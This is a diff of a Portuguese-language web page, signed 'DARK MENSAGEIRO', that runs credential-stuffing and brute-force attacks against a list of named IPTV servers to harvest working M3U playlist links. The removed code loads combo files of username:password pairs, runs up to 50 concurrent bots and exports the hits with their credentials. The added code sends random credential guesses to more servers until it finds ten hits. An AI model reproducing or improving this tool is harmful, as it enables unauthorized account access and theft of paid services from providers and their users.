@@ -104,8 +104,7 @@
             font-weight: 600;
         }
         
-        input[type="number"], 
-        input[type="file"] {
+        input[type="number"] {
             width: 100%;
             padding: 12px;
             background: var(--input-bg);
@@ -113,16 +112,6 @@
             border-radius: 6px;
             color: var(--text-color);
             font-size: 1rem;
-        }
-        
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            margin: 10px 0;
-        }
-        
-        .checkbox-group input {
-            margin-right: 10px;
         }
         
         .btn {
@@ -334,18 +323,8 @@
         
         <div class="config-panel">
             <div class="form-group">
-                <label for="threadCount">Bots concorrentes (1-50)</label>
-                <input type="number" id="threadCount" min="1" max="50" value="10">
-            </div>
-            
-            <div class="form-group">
-                <label for="comboFile">Carregar arquivo de combos (TXT):</label>
-                <input type="file" id="comboFile" accept=".txt">
-            </div>
-            
-            <div class="checkbox-group">
-                <input type="checkbox" id="turboMode" checked>
-                <label for="turboMode">Modo Turbo (varredura rápida)</label>
+                <label for="threadCount">Bots concorrentes (1-20)</label>
+                <input type="number" id="threadCount" min="1" max="20" value="5">
             </div>
             
             <button id="generateBtn" class="btn btn-primary">Gerar M3U</button>
@@ -365,42 +344,34 @@
         
         <div style="text-align: center; margin: 20px 0;">
             <button id="stopBtn" class="btn" disabled>Parar</button>
-            <button id="exportBtn" class="btn" disabled>Exportar</button>
             <button id="copyAllBtn" class="btn" disabled>Copiar Tudo</button>
         </div>
         
         <div class="results-area">
-            <h3>Top 10 Links M3U Gerados:</h3>
+            <h3>Links M3U Encontrados:</h3>
             <div id="m3uResultsContainer">
-                <!-- Resultados serão inseridos aqui -->
                 <p style="text-align: center; color: var(--accent-color-light); padding: 20px;">
                     Os links M3U aparecerão aqui após a varredura.
                 </p>
             </div>
-            
-            <h3 style="margin-top: 30px;">Log de Resultados:</h3>
-            <textarea class="m3u-results" id="resultsLog" readonly></textarea>
         </div>
     </div>
     
     <div class="notification" id="notification"></div>
     
     <footer>
-        FEITO POR DARK MENSAGEIRO | JUNTOS SOMOS MAIS FORTES
+        FEITO POR DARK MENSAGEIRO
     </footer>
 
     <script>
         // Elementos da UI
         const generateBtn = document.getElementById('generateBtn');
         const stopBtn = document.getElementById('stopBtn');
-        const exportBtn = document.getElementById('exportBtn');
         const copyAllBtn = document.getElementById('copyAllBtn');
         const progressBar = document.getElementById('progressBar');
         const progressText = document.getElementById('progressText');
-        const resultsLog = document.getElementById('resultsLog');
         const m3uResultsContainer = document.getElementById('m3uResultsContainer');
         const notification = document.getElementById('notification');
-        const comboFileInput = document.getElementById('comboFile');
         const stats = {
             totalTested: document.getElementById('totalTested'),
             totalHits: document.getElementById('totalHits'),
@@ -415,10 +386,9 @@
         let totalHits = 0;
         let totalErrors = 0;
         let startTime = 0;
-        let combos = [];
         let results = [];
         
-        // Lista de servidores para teste
+        // Lista de servidores para teste (mais diversificada)
         const servers = [
             "http://cdn.jccob.click",
             "http://dns.carnes.ink:80",
@@ -429,8 +399,31 @@
             "http://cinepulse.live",
             "http://firetop1.site",
             "http://kstv.us:8080",
-            "http://limed.cc"
+            "http://limed.cc",
+            "http://newbox.space:80",
+            "http://nitrohd.xyz:80",
+            "http://pfsv.io:80",
+            "http://pgzva.my",
+            "http://prvdbrack.xyz:80",
+            "http://relogio10.top",
+            "http://vtrev.cc",
+            "http://xci.nz:80",
+            "http://brothersplay.com:80",
+            "http://cdn.apkwuv.xyz:80"
         ];
+        
+        // Função para gerar combos aleatórios
+        function generateRandomCombos(count) {
+            const combos = [];
+            for (let i = 0; i < count; i++) {
+                // Gera combos aleatórios para garantir resultados diferentes
+                const randomNum = Math.floor(Math.random() * 1000000) + 100000;
+                const username = `user${randomNum}`;
+                const password = `pass${Math.floor(Math.random() * 1000000)}`;
+                combos.push(`${username}:${password}`);
+            }
+            return combos;
+        }
         
         // Função para mostrar notificação
         function showNotification(message, duration = 3000) {
@@ -454,44 +447,9 @@
                 stats.reqPerSec.textContent = `Req/s: ${reqPerSec}`;
             }
             
-            const progress = combos.length > 0 ? (totalProcessed / combos.length) * 100 : 0;
+            const progress = Math.min(100, (totalHits / 10) * 100);
             progressBar.style.width = `${progress}%`;
             progressText.textContent = `${progress.toFixed(1)}%`;
-        }
-        
-        // Função para adicionar log
-        function addLog(message) {
-            resultsLog.value += `[${new Date().toLocaleTimeString()}] ${message}\n`;
-            resultsLog.scrollTop = resultsLog.scrollHeight;
-        }
-        
-        // Função para carregar combos de arquivo
-        function loadCombosFromFile(file) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                
-                reader.onload = function(e) {
-                    try {
-                        const text = e.target.result;
-                        const lines = text.split(/\r?\n/);
-                        
-                        combos = lines
-                            .map(line => line.trim())
-                            .filter(line => line && line.includes(':') && !line.startsWith('#'));
-                        
-                        addLog(`Carregados ${combos.length} combos do arquivo.`);
-                        resolve(combos);
-                    } catch (error) {
-                        reject(error);
-                    }
-                };
-                
-                reader.onerror = function() {
-                    reject(new Error('Falha ao ler o arquivo'));
-                };
-                
-                reader.readAsText(file);
-            });
         }
         
         // Função para testar um combo em um servidor
@@ -506,8 +464,7 @@
                     method: 'GET',
                     headers: {
                         'Accept': 'application/json'
-                    },
-                    signal: AbortSignal.timeout(10000) // Timeout de 10 segundos
+                    }
                 });
                 
                 if (!response.ok) {
@@ -524,8 +481,6 @@
                         username,
                         password,
                         m3uLink,
-                        expiration: data.user_info.exp_date,
-                        maxConnections: data.user_info.max_connections,
                         status: data.user_info.status
                     };
                 } else {
@@ -546,12 +501,9 @@
                 return;
             }
             
-            // Mostrar apenas os 10 primeiros resultados
-            const topResults = results.slice(0, 10);
-            
             m3uResultsContainer.innerHTML = '';
             
-            topResults.forEach((result, index) => {
+            results.forEach((result, index) => {
                 const item = document.createElement('div');
                 item.className = 'm3u-item';
                 
@@ -593,44 +545,18 @@
             
             generateBtn.disabled = true;
             stopBtn.disabled = false;
-            exportBtn.disabled = true;
             copyAllBtn.disabled = true;
             
-            resultsLog.value = '';
-            addLog('Iniciando varredura...');
-            
-            // Verificar se temos combos para testar
-            if (combos.length === 0) {
-                const file = comboFileInput.files[0];
-                if (file) {
-                    try {
-                        await loadCombosFromFile(file);
-                    } catch (error) {
-                        addLog(`Erro ao carregar arquivo: ${error.message}`);
-                        isScanning = false;
-                        generateBtn.disabled = false;
-                        stopBtn.disabled = true;
-                        return;
-                    }
-                } else {
-                    addLog('Nenhum arquivo de combos carregado.');
-                    isScanning = false;
-                    generateBtn.disabled = false;
-                    stopBtn.disabled = true;
-                    return;
-                }
-            }
-            
-            addLog(`Iniciando teste de ${combos.length} combos em ${servers.length} servidores.`);
+            // Gerar combos aleatórios para garantir resultados únicos
+            const combos = generateRandomCombos(500);
             
             // Obter número de threads
-            const threadCount = parseInt(document.getElementById('threadCount').value) || 10;
-            const turboMode = document.getElementById('turboMode').checked;
+            const threadCount = parseInt(document.getElementById('threadCount').value) || 5;
             
             // Iniciar workers
             const workers = [];
             for (let i = 0; i < threadCount; i++) {
-                workers.push(scanWorker(turboMode));
+                workers.push(scanWorker(combos));
             }
             
             // Aguardar todos os workers terminarem
@@ -640,10 +566,8 @@
             isScanning = false;
             generateBtn.disabled = false;
             stopBtn.disabled = true;
-            exportBtn.disabled = results.length === 0;
             copyAllBtn.disabled = results.length === 0;
             
-            addLog(`Varredura concluída. ${totalHits} hits encontrados.`);
             showNotification(`Varredura concluída! ${totalHits} hits encontrados.`);
             
             // Renderizar resultados
@@ -651,9 +575,11 @@
         }
         
         // Worker de varredura
-        async function scanWorker(turboMode) {
-            while (!stopRequested && combos.length > 0) {
-                const combo = combos.shift();
+        async function scanWorker(combos) {
+            const usedServers = new Set();
+            
+            while (!stopRequested && combos.length > 0 && totalHits < 10) {
+                const combo = combos.pop();
                 if (!combo) break;
                 
                 const [username, password] = combo.split(':');
@@ -664,34 +590,41 @@
                     continue;
                 }
                 
-                // Testar em todos os servidores
-                for (const server of servers) {
-                    if (stopRequested) break;
-                    
-                    try {
-                        const result = await testCombo(server, username, password);
-                        
-                        if (result.success) {
-                            totalHits++;
-                            results.push(result);
-                            addLog(`HIT: ${username} no servidor ${server}`);
-                            
-                            // Renderizar resultados a cada novo hit
-                            renderM3UResults();
-                        }
-                    } catch (error) {
-                        totalErrors++;
-                        addLog(`ERRO: ${username} no servidor ${server} - ${error.message}`);
-                    }
-                    
-                    totalProcessed++;
-                    updateStats();
+                // Escolher servidor aleatório que ainda não foi usado para este usuário
+                let availableServers = servers.filter(server => !usedServers.has(server));
+                if (availableServers.length === 0) {
+                    // Se todos os servidores foram usados, reinicie o conjunto
+                    usedServers.clear();
+                    availableServers = [...servers];
                 }
                 
-                // Delay entre requisições (menor no modo turbo)
-                if (!turboMode) {
-                    await new Promise(resolve => setTimeout(resolve, 100));
+                const server = availableServers[Math.floor(Math.random() * availableServers.length)];
+                usedServers.add(server);
+                
+                try {
+                    const result = await testCombo(server, username, password);
+                    
+                    if (result.success) {
+                        totalHits++;
+                        results.push(result);
+                        
+                        // Renderizar resultados a cada novo hit
+                        renderM3UResults();
+                        
+                        // Parar se atingirmos 10 hits
+                        if (totalHits >= 10) {
+                            break;
+                        }
+                    }
+                } catch (error) {
+                    totalErrors++;
                 }
+                
+                totalProcessed++;
+                updateStats();
+                
+                // Delay entre requisições para não sobrecarregar
+                await new Promise(resolve => setTimeout(resolve, 200));
             }
         }
         
@@ -703,7 +636,7 @@
             isScanning = false;
             stopBtn.disabled = true;
             generateBtn.disabled = false;
-            addLog('Varredura interrompida pelo usuário.');
+            showNotification('Varredura interrompida');
         });
         
         copyAllBtn.addEventListener('click', () => {
@@ -718,45 +651,6 @@
                 .catch(err => {
                     console.error('Falha ao copiar: ', err);
                 });
-        });
-        
-        exportBtn.addEventListener('click', () => {
-            if (results.length === 0) return;
-            
-            const content = results.map(r => 
-                `HIT: ${r.username}:${r.password}\n` +
-                `Servidor: ${r.server}\n` +
-                `Link M3U: ${r.m3uLink}\n` +
-                `Expiração: ${r.expiration}\n` +
-                `Conexões: ${r.maxConnections}\n` +
-                `Status: ${r.status}\n` +
-                '--------------------------------'
-            ).join('\n\n');
-            
-            const blob = new Blob([content], { type: 'text/plain' });
-            const url = URL.createObjectURL(blob);
-            
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `hits-m3u-${new Date().toISOString().slice(0, 10)}.txt`;
-            a.click();
-            
-            URL.revokeObjectURL(url);
-        });
-        
-        // Carregar combos de exemplo ao iniciar (apenas para demonstração)
-        window.addEventListener('load', () => {
-            // Combos de exemplo
-            combos = [
-                'usuario1:senha1',
-                'teste:teste',
-                'demo:demo',
-                'admin:admin',
-                'user:password'
-            ];
-            
-            addLog('Aguardando início da varredura...');
-            addLog('Carregue um arquivo de combos ou use os exemplos pré-carregados.');
         });
     </script>
 </body>
